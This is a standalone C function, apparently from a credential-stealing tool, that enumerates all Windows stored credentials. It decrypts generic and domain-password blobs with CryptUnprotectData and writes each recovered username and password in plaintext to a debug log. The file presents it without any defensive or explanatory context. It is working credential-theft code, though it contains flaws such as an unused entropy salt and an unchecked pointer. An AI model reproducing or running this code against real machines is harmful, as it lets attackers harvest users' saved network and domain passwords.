void EnumerateGenericNetworkPassword()
{
	DATA_BLOB DataIn;
	DATA_BLOB DataOut;
	DATA_BLOB OptionalEntropy;
	DWORD tmpSalt[37];
	char *strSalt={"abe2869f-9b47-4cd9-a358-c22904dba7f7"};

	char strURL[1024];
	char strCredentials[1024];
	char strUsername[1024];
	char strPassword[1024];

	//Create the entropy/salt required for decryption...
	for(int i=0; i< 37; i++)
		tmpSalt[i] = (short int)(strSalt[i] * 4);

	OptionalEntropy.pbData = (BYTE *)&tmpSalt;
	OptionalEntropy.cbData = 74;

	DWORD Count;
	PCREDENTIAL *Credential;

	//Now enumerate all http stored credentials....
	if(CredEnumerate(NULL,CRED_ENUMERATE_ALL_CREDENTIALS,
		&Count,&Credential))
	{
		if(Count)
			deb("got %d creds", Count);
		for(int i=0;i<Count;i++)
		{
			if( Credential[i]->Type == CRED_TYPE_GENERIC)
			{
				DataIn.pbData = (BYTE *)Credential[i]->CredentialBlob;
				DataIn.cbData = Credential[i]->CredentialBlobSize;

				if(CryptUnprotectData(&DataIn, NULL, 
					NULL, NULL,
					NULL,0,&DataOut))
				{
					//Extract username & password from credentails (username:password)
					sprintf_s(strCredentials, 1024, "%S", DataOut.pbData);

					char *ptr = strchr(strCredentials, ':');
					*ptr = '\0';
					strcpy_s(strUsername, 1024, strCredentials);
					ptr++;
					strcpy_s(strPassword, 1024, ptr);

					deb("Generic Network Password account details, "
						" Username=%s, Password=%s", 
						strUsername, strPassword);

				} else {
					deb("failed to unprotect cred (%s)", fmterr(GetLastError()));
				}

			} 
			else if(Credential[i]->Type == CRED_TYPE_DOMAIN_PASSWORD)
			{
				DataIn.pbData = (BYTE *)Credential[i]->CredentialBlob;
				DataIn.cbData = Credential[i]->CredentialBlobSize;

				if(CryptUnprotectData(&DataIn, NULL, 
					NULL, NULL,
					NULL,0,&DataOut))
				{
					//Extract username & password from credentails (username:password)
					sprintf_s(strCredentials, 1024, "%S", DataOut.pbData);

					char *ptr = strchr(strCredentials, ':');
					*ptr = '\0';
					strcpy_s(strUsername, 1024, strCredentials);
					ptr++;
					strcpy_s(strPassword, 1024, ptr);

					deb(" Network Password account details, "
						"Username=%s, Password=%s", 
						strUsername, strPassword);

				} else {
					deb("failed to unprotect cred (%s)", fmterr(GetLastError()));
				}
			} 
			else {
				deb("unk cred type %x", Credential[i]->Type);
			}

		} // End of FOR loop

		CredFree(Credential);
	}

} //End of function